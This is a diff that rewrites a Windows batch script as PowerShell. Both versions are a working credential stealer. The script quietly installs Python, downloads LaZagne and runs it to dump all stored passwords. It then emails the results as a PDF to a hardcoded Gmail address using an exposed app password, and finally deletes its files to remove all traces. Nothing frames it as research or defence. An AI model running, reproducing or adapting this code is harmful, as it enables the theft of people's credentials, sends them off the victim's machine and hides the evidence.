@@ -1,291 +1,370 @@
-@echo off
-setlocal enabledelayedexpansion
+# PowerShell version of LaZagne script for Windows 11
+Write-Host "Starting Windows LaZagne operation..."
+Write-Host "This may take several minutes. Please wait..."
 
-:: Environmental variables for all dependencies
-set LAZAGNE_EXE=%TEMP%\LaZagne.exe
-set LAZAGNE_DIR=%TEMP%\LaZagne
-set RESULTS_FILE=%TEMP%\lazagne_results.txt
-set PDF_FILE=%TEMP%\lazagne_results.pdf
-set PYTHON_SCRIPT=%TEMP%\lazagne_email.py
-set LOG_DIR=%TEMP%\logs
+# Environmental variables
+$TEMP = $env:TEMP
+$LAZAGNE_EXE = Join-Path $TEMP "LaZagne.exe"
+$LAZAGNE_DIR = Join-Path $TEMP "LaZagne"
+$RESULTS_FILE = Join-Path $TEMP "lazagne_results.txt"
+$PDF_FILE = Join-Path $TEMP "lazagne_results.pdf"
+$PYTHON_SCRIPT = Join-Path $TEMP "lazagne_email.py"
+$LOG_DIR = Join-Path $TEMP "logs"
 
-:: Main execution
-echo Starting Windows LaZagne operation...
-echo This may take several minutes. Please wait...
+# Create log directory
+New-Item -ItemType Directory -Path $LOG_DIR -Force | Out-Null
 
-:: Create log directory
-mkdir "%LOG_DIR%" 2>nul
+function Install-Python {
+    Write-Host "Checking for Python..."
+    
+    # Check if Python is already installed
+    try {
+        $pythonVersion = python --version 2>&1
+        if ($LASTEXITCODE -eq 0) {
+            Write-Host "Python is already installed."
+            return $true
+        }
+    }
+    catch {
+        # Python not in PATH, continue with installation
+    }
+    
+    Write-Host "Installing Python..."
+    
+    # Download Python installer
+    $pythonInstaller = Join-Path $TEMP "python_installer.exe"
+    try {
+        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" -OutFile $pythonInstaller -ErrorAction Stop
+    }
+    catch {
+        Write-Host "Failed to download Python installer: $($_.Exception.Message)"
+        return $false
+    }
+    
+    # Install Python silently
+    try {
+        $process = Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1", "Include_test=0" -Wait -PassThru
+        if ($process.ExitCode -ne 0) {
+            throw "Installation failed with exit code $($process.ExitCode)"
+        }
+    }
+    catch {
+        Write-Host "Python installation failed: $($_.Exception.Message)"
+        Remove-Item $pythonInstaller -Force -ErrorAction SilentlyContinue
+        return $false
+    }
+    
+    # Clean up installer
+    Remove-Item $pythonInstaller -Force -ErrorAction SilentlyContinue
+    
+    # Refresh PATH
+    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
+    
+    # Verify installation
+    try {
+        python --version | Out-Null
+        if ($LASTEXITCODE -eq 0) {
+            Write-Host "Python installed successfully."
+            return $true
+        }
+    }
+    catch {
+        Write-Host "Python installation verification failed."
+        return $false
+    }
+    
+    return $false
+}
 
-:: Install Python if needed
-call :install_python
-if !errorlevel! neq 0 (
-    echo Python installation failed.
-    call :cleanup
-    exit /b 1
-)
+function Install-Packages {
+    Write-Host "Installing required Python packages..."
+    
+    try {
+        # Upgrade pip
+        python -m pip install --upgrade pip --quiet 2>$null
+        
+        # Install required packages
+        python -m pip install --quiet reportlab fpdf 2>$null
+        
+        # Verify packages
+        python -c "import reportlab, fpdf" 2>$null
+        if ($LASTEXITCODE -eq 0) {
+            Write-Host "Packages installed successfully."
+            return $true
+        }
+        else {
+            Write-Host "Failed to verify package installation."
+            return $false
+        }
+    }
+    catch {
+        Write-Host "Package installation failed: $($_.Exception.Message)"
+        return $false
+    }
+}
 
-:: Install packages
-call :install_packages
-if !errorlevel! neq 0 (
-    echo Package installation failed.
-    call :cleanup
-    exit /b 1
-)
+function Download-LaZagne {
+    Write-Host "Downloading LaZagne..."
+    
+    try {
+        Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe" -OutFile $LAZAGNE_EXE -ErrorAction Stop
+        
+        if (Test-Path $LAZAGNE_EXE) {
+            Write-Host "LaZagne downloaded successfully."
+            return $true
+        }
+        else {
+            Write-Host "LaZagne download failed - file not found."
+            return $false
+        }
+    }
+    catch {
+        Write-Host "Failed to download LaZagne: $($_.Exception.Message)"
+        return $false
+    }
+}
 
-:: Download LaZagne directly
-call :download_lazagne
-if !errorlevel! neq 0 (
-    echo LaZagne download failed.
-    call :cleanup
-    exit /b 1
-)
+function Create-PythonScript {
+    $scriptContent = @"
+import smtplib, ssl, socket, os, getpass, time
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
 
-:: Create Python email script
-call :create_python_script
+# Set environmental variables
+RESULTS_FILE = r"$RESULTS_FILE"
+PDF_FILE = r"$PDF_FILE"
 
-:: Run LaZagne and capture results
-echo Running LaZagne to retrieve stored credentials...
-mkdir "%LAZAGNE_DIR%" 2>nul
-cd /d "%LAZAGNE_DIR%"
-"%LAZAGNE_EXE%" all > "%RESULTS_FILE%" 2>&1
+# Try to import reportlab with fallback
+try:
+    from reportlab.lib.pagesizes import letter
+    from reportlab.pdfgen import canvas
+    reportlab_available = True
+except ImportError:
+    reportlab_available = False
 
-:: Send results via email
-echo Sending results via email...
-python "%PYTHON_SCRIPT%"
+try:
+    import fpdf
+    fpdf_available = True
+except ImportError:
+    fpdf_available = False
 
-:: Final cleanup
-call :cleanup
+def send_email(subject, body, attachment_path=None):
+    try:
+        gmail_user = "github0987@gmail.com"
+        gmail_app_password = "gwhl efna quvk qhqj"
+        
+        msg = MIMEMultipart()
+        msg["From"] = gmail_user
+        msg["To"] = gmail_user
+        msg["Subject"] = subject
+        msg["X-Priority"] = "1"
+        
+        msg.attach(MIMEText(body, "plain"))
+        
+        if attachment_path and os.path.exists(attachment_path):
+            with open(attachment_path, "rb") as f:
+                part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
+            part["Content-Disposition"] = f"attachment; filename=\"{os.path.basename(attachment_path)}\""
+            msg.attach(part)
+        
+        context = ssl.create_default_context()
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+            server.login(gmail_user, gmail_app_password)
+            server.sendmail(gmail_user, gmail_user, msg.as_string())
+        return True
+    except Exception as e:
+        print(f"Email error: {e}")
+        return False
 
-echo Operation completed successfully. All temporary files cleaned up.
-pause
-exit /b 0
+def create_pdf(content, filename):
+    if reportlab_available:
+        try:
+            c = canvas.Canvas(filename, pagesize=letter)
+            text = c.beginText(40, 750)
+            text.setFont("Helvetica", 10)
+            
+            lines = []
+            for line in content.split("\n"):
+                while len(line) > 100:
+                    lines.append(line[:100])
+                    line = line[100:]
+                lines.append(line)
+            
+            for line in lines:
+                if text.getY() < 40:
+                    c.drawText(text)
+                    c.showPage()
+                    text = c.beginText(40, 750)
+                    text.setFont("Helvetica", 10)
+                text.textLine(line)
+            
+            c.drawText(text)
+            c.save()
+            return True
+        except Exception as e:
+            pass
+    
+    if fpdf_available:
+        try:
+            pdf = fpdf.FPDF()
+            pdf.add_page()
+            pdf.set_font("Arial", size=10)
+            
+            for line in content.split("\n"):
+                pdf.cell(0, 5, line[:90], ln=True)
+            
+            pdf.output(filename)
+            return True
+        except Exception as e:
+            pass
+    
+    try:
+        with open(filename.replace(".pdf", ".txt"), "w") as f:
+            f.write(content)
+        return False
+    except:
+        return False
 
-:: Download LaZagne function
-:download_lazagne
-echo Downloading LaZagne...
-curl -fsSL "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe" -o "%LAZAGNE_EXE%" >nul 2>&1
-if !errorlevel! neq 0 (
-    echo Failed to download LaZagne.
-    exit /b 1
-)
+# Get system info
+username = getpass.getuser()
+hostname = socket.gethostname()
+system_os = "Windows"
 
-if not exist "%LAZAGNE_EXE%" (
-    echo LaZagne download failed.
-    exit /b 1
-)
+# Read results file
+lazagne_output = ""
+try:
+    with open(RESULTS_FILE, "r", encoding="utf-8", errors="ignore") as f:
+        lazagne_output = f.read()
+except:
+    lazagne_output = "Failed to read results file"
 
-echo LaZagne downloaded successfully.
-exit /b 0
+# Create PDF with results
+pdf_created = create_pdf(lazagne_output, PDF_FILE)
 
-:: Cleanup function to remove all traces
-:cleanup
-echo Starting cleanup process...
+# Send LaZagne results via email with PDF attachment
+results_subject = "LaZagne Results from " + hostname
+time_str = time.strftime("%Y-%m-%d %H:%M:%S")
+results_body = "System: " + hostname + " (" + system_os + ")\nUser: " + username + "\nTime: " + time_str
 
-:: Remove installed files and directories
-del /f /q "%LAZAGNE_EXE%" "%RESULTS_FILE%" "%PDF_FILE%" "%PYTHON_SCRIPT%" 2>nul
-rd /s /q "%LAZAGNE_DIR%" "%LOG_DIR%" 2>nul
+if pdf_created:
+    send_email(results_subject, results_body, PDF_FILE)
+else:
+    results_body += "\n\nLaZagne Output:\n" + lazagne_output[:1500]
+    send_email(results_subject, results_body)
 
-:: Remove other temporary files
-del /f /q "%TEMP%\LaZagne*" "%TEMP%\lazagne_*" 2>nul
-del /f /q "%TEMP%\reportlab*" "%TEMP%\fpdf*" 2>nul
+# Final success notification
+time_str = time.strftime("%Y-%m-%d %H:%M:%S")
+send_email("All Operations Completed", "Complete operation successful on " + hostname + ". System: " + system_os + ", User: " + username + ", Time: " + time_str)
 
-:: Clear Python cache
-for /r "%TEMP%" %%f in (*.pyc *.pyo) do del /f /q "%%f" 2>nul
-for /d /r "%TEMP%" %%d in (__pycache__) do rd /s /q "%%d" 2>nul
+print("All operations completed successfully. Check your email for details.")
+"@
 
-echo Cleanup completed. All traces removed.
-goto :eof
+    try {
+        Set-Content -Path $PYTHON_SCRIPT -Value $scriptContent -Encoding UTF8
+        return $true
+    }
+    catch {
+        Write-Host "Failed to create Python script: $($_.Exception.Message)"
+        return $false
+    }
+}
 
-:: Install Python if not present
-:install_python
-echo Checking for Python...
-python --version >nul 2>&1
-if !errorlevel! equ 0 (
-    echo Python is already installed.
-    goto :eof
-)
+function Cleanup {
+    Write-Host "Starting cleanup process..."
+    
+    # Remove files
+    $filesToRemove = @(
+        $LAZAGNE_EXE,
+        $RESULTS_FILE,
+        $PDF_FILE,
+        $PYTHON_SCRIPT,
+        (Join-Path $TEMP "LaZagne*"),
+        (Join-Path $TEMP "lazagne_*"),
+        (Join-Path $TEMP "reportlab*"),
+        (Join-Path $TEMP "fpdf*")
+    )
+    
+    foreach ($file in $filesToRemove) {
+        try {
+            Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
+        }
+        catch {}
+    }
+    
+    # Remove directories
+    $dirsToRemove = @(
+        $LAZAGNE_DIR,
+        $LOG_DIR
+    )
+    
+    foreach ($dir in $dirsToRemove) {
+        try {
+            Remove-Item -Path $dir -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        catch {}
+    }
+    
+    # Clear Python cache
+    try {
+        Get-ChildItem -Path $TEMP -Recurse -Include "*.pyc", "*.pyo" | Remove-Item -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $TEMP -Recurse -Directory -Include "__pycache__" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    catch {}
+    
+    Write-Host "Cleanup completed. All traces removed."
+}
 
-echo Installing Python...
-curl -fsSL https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -o "%TEMP%\python_installer.exe" >nul 2>&1
-if !errorlevel! neq 0 (
-    echo Failed to download Python installer.
-    exit /b 1
-)
-
-:: Silent install Python
-start /wait "" "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 >nul 2>&1
-del /f /q "%TEMP%\python_installer.exe" 2>nul
-
-:: Refresh PATH to include Python
-for %%i in (python.exe) do set "PYTHON_EXE=%%~$PATH:i"
-if not defined PYTHON_EXE (
-    set PATH=%PATH%;C:\Python310;C:\Python310\Scripts
-)
-
-python --version >nul 2>&1
-if !errorlevel! neq 0 (
-    echo Python installation failed.
-    exit /b 1
-)
-
-echo Python installed successfully.
-goto :eof
-
-:: Install required Python packages
-:install_packages
-echo Installing required Python packages...
-
-:: Upgrade pip
-python -m pip install --upgrade pip --quiet >nul 2>&1
-
-:: Install packages
-python -m pip install --quiet reportlab fpdf --quiet >nul 2>&1
-
-:: Check if packages installed successfully
-python -c "import reportlab, fpdf" 2>nul
-if !errorlevel! neq 0 (
-    echo Failed to install required packages.
-    exit /b 1
-)
-
-echo Packages installed successfully.
-goto :eof
-
-:: Create Python script
-:create_python_script
-(
-echo import smtplib, ssl, socket, os, getpass, time
-echo from email.mime.text import MIMEText
-echo from email.mime.multipart import MIMEMultipart
-echo from email.mime.application import MIMEApplication
-echo.
-echo # Set environmental variables from batch
-echo RESULTS_FILE = os.environ.get("RESULTS_FILE", r"%RESULTS_FILE%")
-echo PDF_FILE = os.environ.get("PDF_FILE", r"%PDF_FILE%")
-echo.
-echo # Try to import reportlab with fallback
-echo try:
-echo     from reportlab.lib.pagesizes import letter
-echo     from reportlab.pdfgen import canvas
-echo     reportlab_available = True
-echo except ImportError:
-echo     reportlab_available = False
-echo.
-echo try:
-echo     import fpdf
-echo     fpdf_available = True
-echo except ImportError:
-echo     fpdf_available = False
-echo.
-echo def send_email(subject, body, attachment_path=None):
-echo     try:
-echo         gmail_user = "github0987@gmail.com"
-echo         gmail_app_password = "gwhl efna quvk qhqj"
-echo.        
-echo         msg = MIMEMultipart()
-echo         msg["From"] = gmail_user
-echo         msg["To"] = gmail_user
-echo         msg["Subject"] = subject
-echo         msg["X-Priority"] = "1"
-echo.        
-echo         msg.attach(MIMEText(body, "plain"))
-echo.        
-echo         if attachment_path and os.path.exists(attachment_path):
-echo             with open(attachment_path, "rb") as f:
-echo                 part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
-echo             part["Content-Disposition"] = f"attachment; filename=\\"{os.path.basename(attachment_path)}\\""
-echo             msg.attach(part)
-echo.        
-echo         context = ssl.create_default_context()
-echo         with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
-echo             server.login(gmail_user, gmail_app_password)
-echo             server.sendmail(gmail_user, gmail_user, msg.as_string())
-echo         return True
-echo     except Exception as e:
-echo         print(f"Email error: {e}")
-echo         return False
-echo.
-echo def create_pdf(content, filename):
-echo     if reportlab_available:
-echo         try:
-echo             c = canvas.Canvas(filename, pagesize=letter)
-echo             text = c.beginText(40, 750)
-echo             text.setFont("Helvetica", 10)
-echo.            
-echo             lines = []
-echo             for line in content.split("\n"):
-echo                 while len(line) > 100:
-echo                     lines.append(line[:100])
-echo                     line = line[100:]
-echo                 lines.append(line)
-echo.            
-echo             for line in lines:
-echo                 if text.getY() < 40:
-echo                     c.drawText(text)
-echo                     c.showPage()
-echo                     text = c.beginText(40, 750)
-echo                     text.setFont("Helvetica", 10)
-echo                 text.textLine(line)
-echo.            
-echo             c.drawText(text)
-echo             c.save()
-echo             return True
-echo         except Exception as e:
-echo             pass
-echo.    
-echo     if fpdf_available:
-echo         try:
-echo             pdf = fpdf.FPDF()
-echo             pdf.add_page()
-echo             pdf.set_font("Arial", size=10)
-echo.            
-echo             for line in content.split("\n"):
-echo                 pdf.cell(0, 5, line[:90], ln=True)
-echo.            
-echo             pdf.output(filename)
-echo             return True
-echo         except Exception as e:
-echo             pass
-echo.    
-echo     try:
-echo         with open(filename.replace(".pdf", ".txt"), "w") as f:
-echo             f.write(content)
-echo         return False
-echo     except:
-echo         return False
-echo.
-echo # Get system info
-echo username = getpass.getuser()
-echo hostname = socket.gethostname()
-echo system_os = "Windows"
-echo.
-echo # Read results file
-echo lazagne_output = ""
-echo try:
-echo     with open(RESULTS_FILE, "r", encoding="utf-8", errors="ignore") as f:
-echo         lazagne_output = f.read()
-echo except:
-echo     lazagne_output = "Failed to read results file"
-echo.
-echo # Create PDF with results
-echo pdf_created = create_pdf(lazagne_output, PDF_FILE)
-echo.
-echo # Send LaZagne results via email with PDF attachment
-echo results_subject = "LaZagne Results from " + hostname
-echo time_str = time.strftime("%%Y-%%m-%%d %%H:%%M:%%S")
-echo results_body = "System: " + hostname + " (" + system_os + ")\nUser: " + username + "\nTime: " + time_str
-echo.
-echo if pdf_created:
-echo     send_email(results_subject, results_body, PDF_FILE)
-echo else:
-echo     results_body += "\n\nLaZagne Output:\n" + lazagne_output[:1500]
-echo     send_email(results_subject, results_body)
-echo.
-echo # Final success notification
-echo time_str = time.strftime("%%Y-%%m-%%d %%H:%%M:%%S")
-echo send_email("All Operations Completed", "Complete operation successful on " + hostname + ". System: " + system_os + ", User: " + username + ", Time: " + time_str)
-echo.
-echo print("All operations completed successfully. Check your email for details.")
-) > "%PYTHON_SCRIPT%"
-
-goto :eof
+# Main execution flow
+try {
+    # Install Python if needed
+    if (-not (Install-Python)) {
+        Write-Host "Python installation failed."
+        Cleanup
+        exit 1
+    }
+    
+    # Install packages
+    if (-not (Install-Packages)) {
+        Write-Host "Package installation failed."
+        Cleanup
+        exit 1
+    }
+    
+    # Download LaZagne
+    if (-not (Download-LaZagne)) {
+        Write-Host "LaZagne download failed."
+        Cleanup
+        exit 1
+    }
+    
+    # Create Python email script
+    if (-not (Create-PythonScript)) {
+        Write-Host "Failed to create Python script."
+        Cleanup
+        exit 1
+    }
+    
+    # Run LaZagne and capture results
+    Write-Host "Running LaZagne to retrieve stored credentials..."
+    New-Item -ItemType Directory -Path $LAZAGNE_DIR -Force | Out-Null
+    Set-Location $LAZAGNE_DIR
+    
+    & $LAZAGNE_EXE all 2>&1 | Out-File -FilePath $RESULTS_FILE -Encoding UTF8
+    
+    # Send results via email
+    Write-Host "Sending results via email..."
+    python $PYTHON_SCRIPT
+    
+    # Final cleanup
+    Cleanup
+    
+    Write-Host "Operation completed successfully. All temporary files cleaned up."
+    Write-Host "Press any key to continue..."
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+}
+catch {
+    Write-Host "An error occurred: $($_.Exception.Message)"
+    Cleanup
+    exit 1
+}
